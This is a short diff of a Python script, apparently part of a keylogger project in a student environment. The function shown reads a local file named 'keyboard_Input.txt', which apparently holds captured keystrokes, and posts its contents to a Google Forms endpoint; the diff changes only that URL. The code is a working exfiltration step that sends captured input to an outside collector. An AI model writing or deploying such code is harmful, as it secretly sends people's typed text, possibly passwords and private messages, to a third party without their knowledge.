@@ -13,7 +13,7 @@ time.sleep(1)
 def send_request():
     form_input = open("/home/student/Desktop/scripts/keyboard_Input.txt")
     form_send = form_input.read()
-    url='https://docs.google.com/forms/d/e/1FAIpQLSfCRT-wxg944edJ2vAy9cAl5WhvupufTw2sGmDqP0U65EWtXw/formResponse'
+    url='https://docs.google.com/forms/u/0/d/e/1FAIpQLSfCRT-wxg944edJ2vAy9cAl5WhvupufTw2sGmDqP0U65EWtXw/formResponse'
     form_data = {'entry.1012171706': f"'{form_send}'"}
     r = requests.post(url, data=form_data)
 
